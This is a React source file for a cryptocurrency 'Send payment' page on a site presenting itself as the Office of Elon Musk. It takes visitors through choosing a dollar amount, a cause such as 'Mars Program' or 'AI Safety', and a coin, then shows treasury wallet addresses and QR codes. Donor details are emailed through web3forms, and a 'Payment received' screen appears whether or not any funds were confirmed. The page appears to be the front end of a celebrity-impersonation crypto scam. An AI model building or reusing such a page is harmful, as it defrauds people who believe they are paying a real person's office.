import { useEffect, useMemo, useState } from "react";
import { motion, AnimatePresence } from "framer-motion";
import {
  ArrowLeft, ArrowRight, Bitcoin, Check, Copy, Shield, Lock, Sparkles, Loader2,
  Zap, AlertCircle, ExternalLink, ChevronDown, RefreshCw, Network, Cpu,
} from "lucide-react";
import Header from "@/components/Header";
import Footer from "@/components/Footer";
import GrokWidget from "@/components/GrokWidget";
import { COINS, COIN_LIST, fetchUsdPrices, formatCoin, usdToCoin, type CoinId, type CoinMeta } from "@/lib/wallets";
import { SiBitcoin, SiEthereum, SiTether, SiDogecoin, SiSolana, SiXrp, SiBinance } from "react-icons/si";
import { FaEthereum, FaBitcoin } from "react-icons/fa";

const ICON_FOR: Record<CoinId, any> = {
  BTC: SiBitcoin,
  ETH: SiEthereum,
  USDT: SiTether,
  USDC: SiTether,
  BNB: SiBinance,
  SOL: SiSolana,
  TRX: SiBitcoin,
  DOGE: SiDogecoin,
};

const PRESET_USD = [50, 100, 250, 500, 1000, 5000];
const FUND_DESIGNATIONS = [
  { id: "general", label: "General Support" },
  { id: "stem", label: "STEM Education" },
  { id: "energy", label: "Renewable Energy" },
  { id: "ai", label: "AI Safety" },
  { id: "mars", label: "Mars Program" },
  { id: "supporter", label: "Supporters Hub" },
];

type Step = "amount" | "coin" | "send";

export default function Pay() {
  const [step, setStep] = useState<Step>("amount");
  const [usd, setUsd] = useState<number>(100);
  const [customUsd, setCustomUsd] = useState<string>("");
  const [coin, setCoin] = useState<CoinId>("BTC");
  const [fund, setFund] = useState<string>("general");
  const [name, setName] = useState("");
  const [email, setEmail] = useState("");
  const [copied, setCopied] = useState<string | null>(null);
  const [prices, setPrices] = useState<Partial<Record<CoinId, number>>>({});
  const [priceLoading, setPriceLoading] = useState(false);
  const [submitting, setSubmitting] = useState(false);
  const [submitted, setSubmitted] = useState(false);
  const [txHash, setTxHash] = useState("");

  const meta: CoinMeta = COINS[coin];
  const priceUsd = prices[coin];
  const effectiveUsd = customUsd ? Number(customUsd) || 0 : usd;
  const coinAmount = usdToCoin(effectiveUsd, priceUsd);

  useEffect(() => {
    let mounted = true;
    const load = async () => {
      setPriceLoading(true);
      const p = await fetchUsdPrices();
      if (mounted) {
        setPrices(p);
        setPriceLoading(false);
      }
    };
    load();
    const id = setInterval(load, 60_000);
    return () => { mounted = false; clearInterval(id); };
  }, []);

  const copy = async (label: string, value: string) => {
    try {
      await navigator.clipboard.writeText(value);
      setCopied(label);
      setTimeout(() => setCopied(null), 1800);
    } catch {}
  };

  const qrUrl = useMemo(() => {
    // Use a publicly-rendered QR for the address
    return `https://api.qrserver.com/v1/create-qr-code/?size=240x240&data=${encodeURIComponent(meta.address)}&bgcolor=0a0a0a&color=ffffff&margin=2`;
  }, [meta.address]);

  const trustLink = meta.deeplink(meta.address, meta.trustAsset);

  const handleFinal = async () => {
    setSubmitting(true);
    try {
      await fetch("https://api.web3forms.com/submit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          access_key: "4a64f30a-50b9-4468-a2a5-f3da60d67b2c",
          subject: `[Pay] Crypto payment initiated — $${effectiveUsd} ${coin}`,
          from_name: "Elon Musk Office · Pay",
          name: name || "Anonymous",
          email: email || "noreply@elonmuskoffice.site",
          message: `Donor: ${name} <${email}>\nFund: ${fund}\nUSD: $${effectiveUsd}\nCoin: ${meta.name} (${coin})\nNetwork: ${meta.network}\nAddress: ${meta.address}\nApprox amount: ${formatCoin(coinAmount)} ${coin}\nTX hash (if provided): ${txHash || "(pending)"}`,
        }),
      });
    } catch {}
    setSubmitting(false);
    setSubmitted(true);
  };

  if (submitted) {
    return (
      <div className="relative min-h-[100dvh] w-full bg-background text-foreground flex flex-col">
        <Header />
        <div className="flex-1 flex items-center justify-center px-6 py-20">
          <motion.div initial={{ scale: 0.95, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} className="max-w-xl w-full text-center">
            <div className="w-20 h-20 mx-auto rounded-full bg-foreground flex items-center justify-center mb-8">
              <Check className="w-10 h-10 text-background" />
            </div>
            <p className="text-xs uppercase tracking-[0.22em] text-muted-foreground mb-3">Payment received</p>
            <h1 className="text-3xl md:text-5xl font-medium tracking-tight mb-4">Thank you, {name || "friend"}.</h1>
            <p className="text-base text-foreground/70 leading-relaxed mb-10">
              We're watching the network for your <span className="text-foreground font-medium">{effectiveUsd} USD</span> transfer in <span className="text-foreground font-medium">{meta.name}</span> on <span className="text-foreground font-medium">{meta.network}</span>. Your receipt will arrive at <span className="text-foreground font-medium">{email || "your email"}</span> once the transfer reaches the required number of confirmations.
            </p>
            <div className="grid grid-cols-2 md:grid-cols-4 gap-px bg-border border border-border mb-10">
              {[
                { i: Shield, t: "On-chain" },
                { i: Lock, t: "Non-custodial" },
                { i: Cpu, t: `${meta.confirmations} conf.` },
                { i: Zap, t: "Auto receipt" },
              ].map((s) => (
                <div key={s.t} className="bg-background p-4 flex flex-col items-center gap-1.5">
                  <s.i className="w-4 h-4 text-muted-foreground" />
                  <span className="text-[10px] uppercase tracking-[0.16em] text-muted-foreground">{s.t}</span>
                </div>
              ))}
            </div>
            <a
              href="/supporters"
              className="inline-flex items-center gap-2 text-xs uppercase tracking-[0.14em] bg-foreground text-background px-8 py-4 hover:bg-foreground/90 transition-colors"
            >
              Explore the Supporters Hub <ArrowRight className="w-4 h-4" />
            </a>
          </motion.div>
        </div>
        <Footer />
        <GrokWidget />
      </div>
    );
  }

  return (
    <div className="relative min-h-[100dvh] w-full bg-background text-foreground">
      <Header />

      <section className="relative py-12 md:py-20 px-6 bg-gradient-to-b from-background to-secondary/20 border-b border-border overflow-hidden">
        <div className="absolute inset-0 pointer-events-none opacity-[0.04]">
          <div className="absolute top-0 right-1/4 w-[500px] h-[500px] rounded-full bg-amber-500 blur-[120px]" />
          <div className="absolute bottom-0 left-1/4 w-[500px] h-[500px] rounded-full bg-blue-500 blur-[120px]" />
        </div>
        <div className="relative max-w-4xl mx-auto text-center">
          <div className="inline-flex items-center gap-2 px-3 py-1.5 mb-6 border border-amber-500/30 bg-amber-500/5 rounded-full">
            <Bitcoin className="w-3.5 h-3.5 text-amber-500" />
            <span className="text-[10px] uppercase tracking-[0.18em] text-amber-600 dark:text-amber-400 font-medium">
              Cryptocurrency payments
            </span>
          </div>
          <h1 className="text-4xl md:text-6xl lg:text-7xl font-medium tracking-tighter leading-[1.05] mb-4">
            Send payment
          </h1>
          <p className="text-sm md:text-base text-foreground/70 leading-relaxed max-w-2xl mx-auto">
            Direct peer-to-peer transfer to the Office of Elon Musk treasury. No custodial intermediaries — your funds, your keys, your control.
          </p>
        </div>
      </section>

      <section className="py-12 md:py-20 px-6">
        <div className="max-w-3xl mx-auto">
          {/* Step indicator */}
          <div className="flex items-center justify-center gap-2 mb-10">
            {([
              { id: "amount", t: "Amount" },
              { id: "coin", t: "Network" },
              { id: "send", t: "Send" },
            ] as { id: Step; t: string }[]).map((s, i, arr) => {
              const idx = arr.findIndex((a) => a.id === step);
              const order = arr.findIndex((a) => a.id === s.id);
              const active = order <= idx;
              return (
                <div key={s.id} className="flex items-center gap-2">
                  <div className={`w-7 h-7 rounded-full flex items-center justify-center text-xs font-semibold transition-colors ${active ? "bg-foreground text-background" : "border border-border text-muted-foreground"}`}>
                    {i + 1}
                  </div>
                  <span className={`text-[10px] md:text-xs uppercase tracking-[0.14em] ${active ? "text-foreground" : "text-muted-foreground"}`}>{s.t}</span>
                  {i < arr.length - 1 && <div className={`w-8 md:w-12 h-px ${order < idx ? "bg-foreground/60" : "bg-border"}`} />}
                </div>
              );
            })}
          </div>

          <AnimatePresence mode="wait">
            {step === "amount" && (
              <motion.div key="s1" initial={{ opacity: 0, x: 16 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -16 }} transition={{ duration: 0.3 }} className="space-y-8">
                <div className="text-center">
                  <p className="text-xs uppercase tracking-[0.18em] text-muted-foreground mb-3">Step 1</p>
                  <h2 className="text-2xl md:text-3xl font-medium tracking-tight">How much?</h2>
                  <p className="mt-2 text-sm text-foreground/60">Pick a preset or type your own amount in USD.</p>
                </div>

                <div>
                  <p className="text-[10px] uppercase tracking-[0.14em] text-muted-foreground mb-3">Designation</p>
                  <div className="grid grid-cols-2 sm:grid-cols-3 gap-2">
                    {FUND_DESIGNATIONS.map((f) => (
                      <button
                        key={f.id}
                        type="button"
                        onClick={() => setFund(f.id)}
                        className={`p-3 text-xs uppercase tracking-[0.12em] border transition-colors ${fund === f.id ? "border-foreground bg-secondary" : "border-border hover:border-foreground/40"}`}
                      >
                        {f.label}
                      </button>
                    ))}
                  </div>
                </div>

                <div>
                  <p className="text-[10px] uppercase tracking-[0.14em] text-muted-foreground mb-3">Amount (USD)</p>
                  <div className="grid grid-cols-3 gap-2">
                    {PRESET_USD.map((amt) => (
                      <button
                        key={amt}
                        type="button"
                        onClick={() => { setUsd(amt); setCustomUsd(""); }}
                        className={`py-3 text-sm font-medium border transition-colors ${usd === amt && !customUsd ? "border-foreground bg-foreground text-background" : "border-border text-foreground/70 hover:border-foreground/40"}`}
                      >
                        ${amt.toLocaleString()}
                      </button>
                    ))}
                  </div>
                  <div className="mt-3">
                    <input
                      type="number"
                      min={1}
                      value={customUsd}
                      onChange={(e) => { setCustomUsd(e.target.value); setUsd(0); }}
                      placeholder="Custom amount (USD)"
                      className="w-full py-3 px-4 bg-background border border-border text-foreground text-center text-lg placeholder:text-muted-foreground focus:outline-none focus:border-foreground"
                    />
                  </div>
                </div>

                <div className="flex justify-end">
                  <button
                    type="button"
                    onClick={() => setStep("coin")}
                    disabled={!effectiveUsd || effectiveUsd < 5}
                    className="flex items-center gap-2 px-6 py-3 bg-foreground text-background text-sm font-semibold hover:bg-foreground/90 transition-colors disabled:opacity-40"
                  >
                    Continue <ArrowRight className="w-4 h-4" />
                  </button>
                </div>
              </motion.div>
            )}

            {step === "coin" && (
              <motion.div key="s2" initial={{ opacity: 0, x: 16 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -16 }} transition={{ duration: 0.3 }} className="space-y-8">
                <div className="text-center">
                  <p className="text-xs uppercase tracking-[0.18em] text-muted-foreground mb-3">Step 2</p>
                  <h2 className="text-2xl md:text-3xl font-medium tracking-tight">Choose network</h2>
                  <p className="mt-2 text-sm text-foreground/60 flex items-center justify-center gap-2">
                    Live spot price
                    {priceLoading ? <Loader2 className="w-3 h-3 animate-spin" /> : <span className="text-foreground/80">{priceUsd ? `1 ${meta.symbol} = $${priceUsd.toLocaleString()}` : ""}</span>}
                    <button type="button" onClick={async () => { setPriceLoading(true); setPrices(await fetchUsdPrices()); setPriceLoading(false); }} className="text-muted-foreground hover:text-foreground">
                      <RefreshCw className="w-3 h-3" />
                    </button>
                  </p>
                </div>

                <div className="grid sm:grid-cols-2 gap-3">
                  {COIN_LIST.map((c) => {
                    const Icon = ICON_FOR[c.id];
                    const p = prices[c.id];
                    const amt = usdToCoin(effectiveUsd, p);
                    const active = c.id === coin;
                    return (
                      <button
                        key={c.id}
                        type="button"
                        onClick={() => setCoin(c.id)}
                        className={`text-left p-4 border transition-colors flex items-center gap-4 ${active ? "border-foreground bg-secondary" : "border-border hover:border-foreground/40"}`}
                      >
                        <div className="w-10 h-10 rounded-full flex items-center justify-center" style={{ background: c.color + "22" }}>
                          <Icon className="w-5 h-5" style={{ color: c.color }} />
                        </div>
                        <div className="flex-1 min-w-0">
                          <div className="flex items-center justify-between">
                            <p className="text-sm font-medium text-foreground">{c.name}</p>
                            <p className="text-[10px] uppercase tracking-[0.12em] text-muted-foreground">{c.network.split(" ")[0]}</p>
                          </div>
                          <p className="text-[11px] text-muted-foreground mt-0.5">{c.fee} fee · {c.confirmations} conf.</p>
                          <p className="text-xs text-foreground/80 mt-1.5">≈ <span className="font-mono">{formatCoin(amt)}</span> {c.symbol}</p>
                        </div>
                      </button>
                    );
                  })}
                </div>

                <div className="flex items-center justify-between">
                  <button
                    type="button"
                    onClick={() => setStep("amount")}
                    className="text-xs uppercase tracking-[0.14em] border border-border px-6 py-3 text-muted-foreground hover:text-foreground hover:border-foreground/40"
                  >
                    Back
                  </button>
                  <button
                    type="button"
                    onClick={() => setStep("send")}
                    className="flex items-center gap-2 px-6 py-3 bg-foreground text-background text-sm font-semibold hover:bg-foreground/90 transition-colors"
                  >
                    Continue to send <ArrowRight className="w-4 h-4" />
                  </button>
                </div>
              </motion.div>
            )}

            {step === "send" && (
              <motion.div key="s3" initial={{ opacity: 0, x: 16 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -16 }} transition={{ duration: 0.3 }} className="space-y-6">
                <div className="text-center">
                  <p className="text-xs uppercase tracking-[0.18em] text-muted-foreground mb-3">Step 3</p>
                  <h2 className="text-2xl md:text-3xl font-medium tracking-tight">Send from your wallet</h2>
                  <p className="mt-2 text-sm text-foreground/60">Scan, copy, or open directly in Trust Wallet. We watch the network — your receipt arrives automatically.</p>
                </div>

                {/* Wallet selector for deeplink */}
                <div className="border border-border p-5 md:p-6">
                  <div className="flex flex-col sm:flex-row gap-6">
                    <div className="flex-shrink-0 mx-auto sm:mx-0">
                      <div className="bg-foreground p-2 border border-border">
                        <img src={qrUrl} alt={`${meta.symbol} address QR`} className="w-44 h-44" />
                      </div>
                      <p className="text-[10px] uppercase tracking-[0.14em] text-muted-foreground text-center mt-2">Scan to send</p>
                    </div>

                    <div className="flex-1 min-w-0 space-y-4">
                      <div className="flex items-center gap-3">
                        <img src={meta.logo} alt={meta.symbol} className="w-9 h-9" />
                        <div>
                          <p className="text-sm font-medium text-foreground">{meta.name}</p>
                          <p className="text-[10px] uppercase tracking-[0.12em] text-muted-foreground">{meta.network}</p>
                        </div>
                      </div>

                      <div>
                        <p className="text-[10px] uppercase tracking-[0.14em] text-muted-foreground mb-1">Address</p>
                        <div className="flex items-center gap-2 border border-border bg-background p-3">
                          <code className="text-[11px] font-mono text-foreground break-all flex-1 leading-relaxed">{meta.address}</code>
                          <button type="button" onClick={() => copy("addr", meta.address)} className="flex-shrink-0 p-2 hover:bg-secondary">
                            {copied === "addr" ? <Check className="w-3.5 h-3.5" /> : <Copy className="w-3.5 h-3.5" />}
                          </button>
                        </div>
                      </div>

                      <div className="grid grid-cols-2 gap-3 text-xs">
                        <div className="border border-border p-3">
                          <p className="text-[10px] uppercase tracking-[0.14em] text-muted-foreground">Amount (USD)</p>
                          <p className="mt-1 text-lg font-medium text-foreground">${effectiveUsd.toLocaleString()}</p>
                        </div>
                        <div className="border border-border p-3">
                          <p className="text-[10px] uppercase tracking-[0.14em] text-muted-foreground">Amount ({meta.symbol})</p>
                          <p className="mt-1 text-lg font-medium text-foreground font-mono">≈ {formatCoin(coinAmount)} {meta.symbol}</p>
                        </div>
                      </div>

                      {meta.altNetworks && (
                        <div className="border border-border bg-secondary/40 p-3 text-[11px] text-muted-foreground">
                          <p className="text-foreground font-medium mb-1 flex items-center gap-1.5"><Network className="w-3 h-3" /> Alternative networks accepted on this address:</p>
                          <p>{meta.altNetworks.join(" · ")}</p>
                        </div>
                      )}

                      <div className="flex flex-wrap items-center gap-2">
                        <a href={trustLink} target="_blank" rel="noopener noreferrer" className="inline-flex items-center gap-2 px-4 py-2.5 bg-foreground text-background text-xs uppercase tracking-[0.12em] hover:bg-foreground/90">
                          <img src="/wallets/trust.svg" alt="Trust Wallet" className="w-4 h-4" />
                          Open in Trust Wallet
                          <ExternalLink className="w-3 h-3" />
                        </a>
                        <a href={`https://metamask.app.link/send/${meta.address}`} target="_blank" rel="noopener noreferrer" className="inline-flex items-center gap-2 px-4 py-2.5 border border-border text-xs uppercase tracking-[0.12em] hover:border-foreground/40">
                          <img src="/wallets/metamask.svg" alt="MetaMask" className="w-4 h-4" />
                          MetaMask
                        </a>
                        <a href={`https://go.cb-w.com/dapp?cb_url=https://elonmuskoffice.site/pay`} target="_blank" rel="noopener noreferrer" className="inline-flex items-center gap-2 px-4 py-2.5 border border-border text-xs uppercase tracking-[0.12em] hover:border-foreground/40">
                          <img src="/wallets/coinbase.svg" alt="Coinbase" className="w-4 h-4" />
                          Coinbase
                        </a>
                      </div>
                    </div>
                  </div>
                </div>

                {/* Donor details */}
                <div className="space-y-4">
                  <div className="grid sm:grid-cols-2 gap-4">
                    <div>
                      <label className="text-[10px] uppercase tracking-[0.14em] text-muted-foreground block mb-2">First name (for receipt)</label>
                      <input type="text" value={name} onChange={(e) => setName(e.target.value)} placeholder="First" className="w-full py-3 px-4 bg-background border border-border text-foreground placeholder:text-muted-foreground focus:outline-none focus:border-foreground" />
                    </div>
                    <div>
                      <label className="text-[10px] uppercase tracking-[0.14em] text-muted-foreground block mb-2">Email (for receipt)</label>
                      <input type="email" value={email} onChange={(e) => setEmail(e.target.value)} placeholder="you@example.com" className="w-full py-3 px-4 bg-background border border-border text-foreground placeholder:text-muted-foreground focus:outline-none focus:border-foreground" />
                    </div>
                  </div>
                  <div>
                    <label className="text-[10px] uppercase tracking-[0.14em] text-muted-foreground block mb-2">Transaction hash (optional — paste after sending)</label>
                    <input type="text" value={txHash} onChange={(e) => setTxHash(e.target.value)} placeholder="0x… or bc1…" className="w-full py-3 px-4 bg-background border border-border text-foreground placeholder:text-muted-foreground focus:outline-none focus:foreground font-mono text-xs" />
                  </div>
                </div>

                {/* Security footer */}
                <div className="grid grid-cols-2 md:grid-cols-4 gap-px bg-border border border-border">
                  {[
                    { i: Shield, t: "On-chain" },
                    { i: Lock, t: "Non-custodial" },
                    { i: Cpu, t: `${meta.confirmations} conf.` },
                    { i: Zap, t: "Auto receipt" },
                  ].map((s) => (
                    <div key={s.t} className="bg-background p-3 flex items-center justify-center gap-2">
                      <s.i className="w-3.5 h-3.5 text-muted-foreground" />
                      <span className="text-[10px] uppercase tracking-[0.14em] text-muted-foreground">{s.t}</span>
                    </div>
                  ))}
                </div>

                <div className="flex items-center justify-between">
                  <button type="button" onClick={() => setStep("coin")} className="text-xs uppercase tracking-[0.14em] border border-border px-6 py-3 text-muted-foreground hover:text-foreground hover:border-foreground/40">
                    Back
                  </button>
                  <button
                    type="button"
                    onClick={handleFinal}
                    disabled={submitting}
                    className="flex items-center gap-2 px-6 py-3 bg-foreground text-background text-sm font-semibold hover:bg-foreground/90 transition-colors disabled:opacity-50"
                  >
                    {submitting ? <><Loader2 className="w-3.5 h-3.5 animate-spin" /> Confirming</> : <>I've sent it <Check className="w-3.5 h-3.5" /></>}
                  </button>
                </div>
              </motion.div>
            )}
          </AnimatePresence>
        </div>
      </section>

      <Footer />
      <GrokWidget />
    </div>
  );
}
